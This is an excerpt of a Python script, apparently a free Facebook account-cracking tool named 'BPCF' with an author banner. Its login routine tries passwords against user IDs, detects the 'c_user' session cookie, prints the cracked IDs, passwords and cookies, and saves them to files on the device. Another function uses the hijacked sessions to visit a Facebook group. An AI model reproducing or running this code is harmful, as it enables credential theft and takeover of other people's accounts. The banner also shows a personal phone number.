...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/groups/1620202221368431/?ref=share&mibextid=NSMWBT', {
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mESHAN AHAMED EVU  ]\33[1;38m    \033[1;31m 
╠══[Facebook                 • ESHAN AHAMED EVU ]    \033[1;97m  
╠══[Github                   • \33[1;38mBPCF ]  \33[1;34m   
╠══[Number                  • 01320938366 ]  \33[1;35m 
╠══[TOOLS                    • FREE ]          \33[1;32m   
...
def BPCF():
    ...
    print('Ok Ids Saved in /BPCF-OK❤️.txt')
    print('Cp Ids Saved in /BPCF-CP😭.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[BPCF-OK❤️] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/BPCF-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[BPCF-CP😭]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/BPCF-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mBPCF\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
